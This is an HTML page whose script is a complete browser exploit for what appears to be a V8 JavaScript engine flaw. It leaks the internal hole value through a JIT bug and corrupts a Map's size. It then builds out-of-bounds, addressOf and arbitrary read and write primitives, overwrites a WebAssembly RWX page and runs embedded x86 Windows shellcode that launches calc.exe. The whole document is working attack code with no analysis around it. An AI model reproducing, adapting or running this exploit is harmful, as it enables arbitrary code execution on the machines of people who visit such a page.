<script>
  // function gc(){
  //       for(var i = 0;i < ((0x2000));i++){
  //         var a = new ArrayBuffer(0x10000);
  //       }
  //     }
  function gc()
  {
    /*
    for(var i = 0;i < (0x45);i++){
      var a = new ArrayBuffer(0x100000);
    }
    */
  }
      var buf = new ArrayBuffer(16);
      var f64 = new Float64Array(buf);
      var u32 = new Uint32Array(buf);
      
      var dv = new DataView(buf);
      
      function f2i(val)
      {
          dv.setFloat64(0,val,true);
        return dv.getBigUint64(0,true);
      }
      
      function i2f(val)
      {
          dv.setBigUint64(0,BigInt(val),true);
        return dv.getFloat64(0,true);
      }
      
      function f2half(f)
      {
        f64[0] = f;
        let tmp = Array.from(u32);
        return tmp;
      }
      
      function half2f(val)
      {
        u32.set(val);
        return f64[0];
      }
      
      function p64f(high,low){
        dv.setUint32(0,high,true);
        dv.setUint32(4,low,true);
        return dv.getFloat64(0,true);
      }
    
      function ByteToBigIntArray(payload)
      {
    
          let sc = []
          let tmp = 0n;
          let lenInt = BigInt(Math.floor(payload.length/8))
          for (let i = 0n; i < lenInt; i += 1n) {
              tmp = 0n;
              for(let j=0n; j<8n; j++){
                  tmp += BigInt(payload[i*8n+j])*(0x1n<<(8n*j));
              }
              sc.push(tmp);
          }
    
          let len = payload.length%8;
          tmp = 0n;
          for(let i=0n; i<len; i++){
              tmp += BigInt(payload[lenInt*8n+i])*(0x1n<<(8n*i));
          }
          sc.push(tmp);
          return sc;
      }
    
      function hex(i){
        return "0x"+i.toString(16).padStart(16,"0");
      }
    
      function foo(bug) {
        function C(z) {
            Error.prepareStackTrace = function (t, B) {
                return B[z].getThis();
            };
            let p = Error().stack;
            Error.prepareStackTrace = null;
            return p;
        }

        function J() {}
        var optim = false;
        var opt = new Function(
            'a', 'b', 'c',
            'if(typeof a===\'number\'){if(a>2){for(var i=0;i<100;i++);return;}b.d(a,b,1);return}' +
            'g++;'.repeat(70));
        var e = null;
        J.prototype.d = new Function(
            'a', 'b', '"use strict";b.a.call(arguments,b);return arguments[a];');
        J.prototype.a = new Function('a', 'a.b(0,a)');
        J.prototype.b = new Function(
            'a', 'b',
            'b.c();if(a){' +
            'g++;'.repeat(70) + '}');
        J.prototype.c = function () {
            if (optim) {
                var z = C(3);
                var p = C(3);
                z[0] = 0;
                e = {
                    M: z,
                    C: p
                };
            }
        };
        var a = new J();
        // jit optim
        if (bug) {
            for (var V = 0; 1E4 > V; V++) {
                opt(0 == V % 4 ? 1 : 4, a, 1);
            }
        }
        optim = true;
        opt(1, a, 1);
        return e;
    }
    e2 = foo(true);
    delete e2.M[0];
          
        
        var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
        var wasmModule = new WebAssembly.Module(wasmCode);
        var wasmInstance = new WebAssembly.Instance(wasmModule, {});
        var f = wasmInstance.exports.main;
        var buf = new ArrayBuffer(0x100);
        var dataview = new DataView(buf);
  
        let hole = e2.C[0];
        alert(hole);
        var tmp = {};

        var map = new Map();
        map.set(0xdead, 1);
        map.set(hole, 0x1337);
        // Due to special handling of hole values, this ends up setting the size of the map to -1
        for(let i = 0;i < 2;i++){
          map.delete(hole);
        }

        map.delete(0xdead);
        var float_arr = [6.3659873719076857e-314, 6.3659873719076857e-314,6.3659873719076857e-314,6.3659873719076857e-314,6.3659873719076857e-314,6.3659873719076857e-314,6.3659873719076857e-314,1.1,2.2];
        var cruppted_arr = [1.1,2.2,3.3,4.4,5.5,6.6];
        var target_arr = [7.7,8,8];
        var obj_dict = {mark:0x1337aabb,obj:wasmInstance,mark1:0x0,pad:0x0};
        
        
        map.set(0x37,0);
        //console.log(hex(map.size));
        
        map.set(0x15,cruppted_arr);
        
        //console.log(cruppted_arr.length);
        let element_addr = f2i(cruppted_arr[7]) & 0xffffffffn;
        //console.log("[+]element addr : " + hex(element_addr));
        cruppted_arr[7] = i2f((0x1122n << 32n) + element_addr);
        console.log("[+]oob arr length : " + hex((cruppted_arr.length)));

        var obj_idx = 16;
        function addressOf(){
          return f2i(cruppted_arr[obj_idx])-0x1n;
        }
        let wasm_instance_addr = addressOf();
        console.log("[+]wasm instance addr : " + hex(wasm_instance_addr));
        var element_idx = 13;

        function arb_read(addr){
          cruppted_arr[element_idx] = i2f((4n << 32n) + addr - 0x8n + 0x1n);
          return f2i(target_arr[0]);
      }

      var rwx_page_addr = (arb_read(wasm_instance_addr + 0x40n)) & 0xffffffffn;

      function arb_write(addr,data){
            cruppted_arr[element_idx] = i2f((4n << 32n) + addr - 0x8n + 0x1n);
            target_arr[0] = i2f(data);
        }
        obj_dict.obj = buf;
        let buf_addr = addressOf();
        console.log("[+]buf_addr: ",hex(buf_addr));
        var backing_store = buf_addr + 0x14n;
        console.log("[+]backing_store: ",hex(backing_store));
  
        arb_write(backing_store,(0x2n << 32n) + rwx_page_addr);
        var shellcode = [0x89,0xe5,0x83,0xec,0x20,0x31,0xdb,0x64,0x8b,0x5b,0x30,0x8b,0x5b,0x0c,0x8b,0x5b,0x1c,0x8b,0x1b,0x8b,0x1b,0x8b,0x43,0x08,0x89,0x45,0xfc,0x8b,0x58,0x3c,0x01,0xc3,0x8b,0x5b,0x78,0x01,0xc3,0x8b,0x7b,0x20,0x01,0xc7,0x89,0x7d,0xf8,0x8b,0x4b,0x24,0x01,0xc1,0x89,0x4d,0xf4,0x8b,0x53,0x1c,0x01,0xc2,0x89,0x55,0xf0,0x8b,0x53,0x14,0x89,0x55,0xec,0xeb,0x32,0x31,0xc0,0x8b,0x55,0xec,0x8b,0x7d,0xf8,0x8b,0x75,0x18,0x31,0xc9,0xfc,0x8b,0x3c,0x87,0x03,0x7d,0xfc,0x66,0x83,0xc1,0x08,0xf3,0xa6,0x74,0x05,0x40,0x39,0xd0,0x72,0xe4,0x8b,0x4d,0xf4,0x8b,0x55,0xf0,0x66,0x8b,0x04,0x41,0x8b,0x04,0x82,0x03,0x45,0xfc,0xc3,0xba,0x78,0x78,0x65,0x63,0xc1,0xea,0x08,0x52,0x68,0x57,0x69,0x6e,0x45,0x89,0x65,0x18,0xe8,0xb8,0xff,0xff,0xff,0x31,0xc9,0x51,0x68,0x2e,0x65,0x78,0x65,0x68,0x63,0x61,0x6c,0x63,0x89,0xe3,0x41,0x51,0x53,0xff,0xd0,0x31,0xc9,0xb9,0x01,0x65,0x73,0x73,0xc1,0xe9,0x08,0x51,0x68,0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,0x74,0x89,0x65,0x18,0xe8,0x87,0xff,0xff,0xff,0x31,0xd2,0x52,0xff,0xd0];
        for(var i = 0; i < shellcode.length; i++) {
          dataview.setUint8(i, shellcode[i], true);
        }
        f();
        
       </script> 
